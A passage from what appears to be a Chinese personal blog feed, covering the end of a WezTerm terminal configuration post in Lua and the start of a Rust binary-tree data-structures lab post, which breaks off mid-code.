<span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>DecreaseFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ResetFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 重载配置</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'L'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ReloadConfiguration <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 标签页管理</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'t'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>SpawnTab <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'w'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">CloseCurrentTab</span><span class="token punctuation">&#123;</span> confirm <span class="token operator">=</span> <span class="token keyword">true</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'Tab'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTabRelative</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'Tab'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTabRelative</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">-- 分屏管理</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'d'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">SplitHorizontal</span><span class="token punctuation">&#123;</span> domain <span class="token operator">=</span> <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'D'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">SplitVertical</span><span class="token punctuation">&#123;</span> domain <span class="token operator">=</span> <span class="token string">'CurrentPaneDomain'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'h'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'l'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Right'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'k'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Up'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'j'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ActivatePaneDirection <span class="token string">'Down'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'x'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">CloseCurrentPane</span><span class="token punctuation">&#123;</span> confirm <span class="token operator">=</span> <span class="token keyword">false</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 复制粘贴，备用</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>CopyTo <span class="token string">'Clipboard'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'v'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>PasteFrom <span class="token string">'Clipboard'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 搜索</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'f'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>Search <span class="token string">'CurrentSelectionOrEmptyString'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 清屏</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'k'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>ClearScrollback <span class="token string">'ScrollbackAndViewport'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 新建标签</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL|SHIFT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ShowLauncherArgs</span> <span class="token punctuation">&#123;</span> flags <span class="token operator">=</span> <span class="token string">'FUZZY|LAUNCH_MENU_ITEMS'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">-- 快速跳转到标签页</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'3'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'4'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'5'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'ALT'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">ActivateTab</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">-- 鼠标绑定</span>config<span class="token punctuation">.</span>mouse_bindings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">-- 右键粘贴</span>  <span class="token punctuation">&#123;</span>    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Down <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Right'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    mods <span class="token operator">=</span> <span class="token string">'NONE'</span><span class="token punctuation">,</span>    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>PasteFrom <span class="token string">'Clipboard'</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">-- Ctrl+左键打开链接</span>  <span class="token punctuation">&#123;</span>    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span>    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>OpenLinkAtMouseCursor<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span>    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>OpenLinkAtMouseCursor<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">-- 双击选中整行并复制</span>  <span class="token punctuation">&#123;</span>    event <span class="token operator">=</span> <span class="token punctuation">&#123;</span> Up <span class="token operator">=</span> <span class="token punctuation">&#123;</span> streak <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> button <span class="token operator">=</span> <span class="token string">'Left'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    mods <span class="token operator">=</span> <span class="token string">'NONE'</span><span class="token punctuation">,</span>    action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>CompleteSelection <span class="token string">'ClipboardAndPrimarySelection'</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">-- 超链接规则</span>config<span class="token punctuation">.</span>hyperlink_rules <span class="token operator">=</span> wezterm<span class="token punctuation">.</span><span class="token function">default_hyperlink_rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- 添加自定义规则</span>table<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>hyperlink_rules<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  regex <span class="token operator">=</span> <span class="token string">[[\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b]]</span><span class="token punctuation">,</span>  format <span class="token operator">=</span> <span class="token string">'mailto:$0'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">-- 标签栏样式</span>wezterm<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'format-tab-title'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>tab<span class="token punctuation">,</span> tabs<span class="token punctuation">,</span> panes<span class="token punctuation">,</span> config<span class="token punctuation">,</span> hover<span class="token punctuation">,</span> max_width<span class="token punctuation">)</span>  <span class="token keyword">local</span> title <span class="token operator">=</span> tab<span class="token punctuation">.</span>active_pane<span class="token punctuation">.</span>title  <span class="token keyword">if</span> tab<span class="token punctuation">.</span>is_active <span class="token keyword">then</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">&#123;</span> Text <span class="token operator">=</span> <span class="token string">' 󰆍 '</span> <span class="token operator">..</span> title <span class="token operator">..</span> <span class="token string">' '</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">end</span>  <span class="token keyword">return</span> <span class="token string">' '</span> <span class="token operator">..</span> title <span class="token operator">..</span> <span class="token string">' '</span><span class="token keyword">end</span><span class="token punctuation">)</span><span class="token comment">-- Windows 特定设置</span><span class="token comment">-- 启动菜单 - 可以快速切换不同的 Shell</span>config<span class="token punctuation">.</span>launch_menu <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#123;</span>    label <span class="token operator">=</span> <span class="token string">'WSL Ubuntu (Fish)'</span><span class="token punctuation">,</span>    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'fish'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>    label <span class="token operator">=</span> <span class="token string">'WSL Ubuntu'</span><span class="token punctuation">,</span>    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>    label <span class="token operator">=</span> <span class="token string">'Windows PowerShell'</span><span class="token punctuation">,</span>    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'powershell.exe'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>    label <span class="token operator">=</span> <span class="token string">'Command Prompt'</span><span class="token punctuation">,</span>    args <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'cmd.exe'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>对的，顺便还安装了fish，右箭头自动命令补全真舒服吧！</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>试一下——看起来舒服多了╰(<em>°▽°</em>)╯：</p><p><img src="/image/wezterm/terminal.png" alt="show"></p><p>顺便把fish加到pwn镜像的dockerfile里</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;每天看着暗红色的终端喜新厌旧了，感觉流离用的fish命令提示功能，还有在别人博客上经常看到的暗蓝色的都好酷，正如本文的分类，家要有家的样子，遂重新配置我的终端！&lt;/p&gt;
&lt;p&gt;为什么选wezterm呢？因为它用rust实现，用lua写配置文件——因为喜欢&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="家要有家的样子" scheme="https://aucept.in/categories/%E5%AE%B6%E8%A6%81%E6%9C%89%E5%AE%B6%E7%9A%84%E6%A0%B7%E5%AD%90/"/>
    
    
    <category term="terminal" scheme="https://aucept.in/tags/terminal/"/>
    
    <category term="wezterm" scheme="https://aucept.in/tags/wezterm/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-二叉树实验</title>
    <link href="https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-11-03T03:02:43.000Z</published>
    <updated>2025-11-24T05:50:58.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二叉树的建立与遍历"><a href="#二叉树的建立与遍历" class="headerlink" title="二叉树的建立与遍历"></a>二叉树的建立与遍历</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[问题描述]建立一棵二叉树，并对其进行遍历(先序、中序、后序)，打印输出遍历结果。[基本要求]从键盘接受输入(先序)，以二叉链表作为存储结构，建立二叉树(以先序来建立)，并采用递归算法对其进行遍历(先序、中序、后序)，将遍历结果打印输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第一轮，先定义数据结构与创建：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>    data <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token punctuation">,</span>    left <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">BinaryTree</span><span class="token operator">>></span><span class="token punctuation">,</span>    right <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">BinaryTree</span><span class="token operator">>></span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">BinaryTree</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">BinaryTree</span><span class="token punctuation">&#123;</span>            data <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>            left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>            right <span class="token punctuation">:</span> <span class="token class-name">None</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> d <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nth</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token char">' '</span> <span class="token punctuation">&#123;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"return"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"insert: &#123;&#125;"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> left <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        left<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        right<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">BinaryTree</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABC  DE G  F   "</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把data字段设计为可以为空了，实际上是不必要的，init函数也完全可以把data作为参数……不管了就这么设计了</p><p>传递data参数很有说法，最初想的是每次递归舍弃第一位，只传递剩余的切片，但是涉及右子树行不通，于是把data改为可变的，然后每次create都删去一位，类似于全局变量效果</p><p>运行测试看到输出：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">running 1 testinsert: Ainsert: Binsert: Creturnreturninsert: Dinsert: Ereturninsert: Greturnreturninsert: Freturnreturnreturntest tests::test_create ... ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>第二轮，递归完成遍历<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token macro property">println!</span><span class="token 